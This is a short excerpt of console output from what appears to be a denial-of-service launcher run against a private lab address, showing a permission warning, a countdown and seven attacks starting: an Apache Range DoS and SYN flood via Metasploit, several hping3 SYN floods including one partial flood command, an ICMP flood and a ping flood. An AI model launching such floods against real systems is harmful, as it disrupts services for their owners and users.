...
[!] Only use on systems you own / have written permission to test.
[!] Press Ctrl+C anytime to STOP ALL attacks and exit.

[?] Enter target IP address: 192.168.6.129
[+] Target set to: 192.168.6.129
[!] Attacks launch in 5 seconds. Press Ctrl+C to abort before start.
  5...
  4...
  3...
  2...
  1...
[*] Starting Apache Range DoS (MSF) ...
[*] Starting SYN Flood (MSF) ...
[*] Starting SYN Flood port 80 (hping3) ...
[*] Starting SYN Flood port 22 (hping3) ...
[*] Starting multi-port SYN Flood hping3 -S --flood -p ++1 ...
[*] Starting ICMP Flood (hping3) ...
[*] Starting Ping Flood ...
[+] All 7 attack threads launched against 192.168.6.129
...
[*] DoS running. Press Ctrl+C to STOP ALL and exit.
```
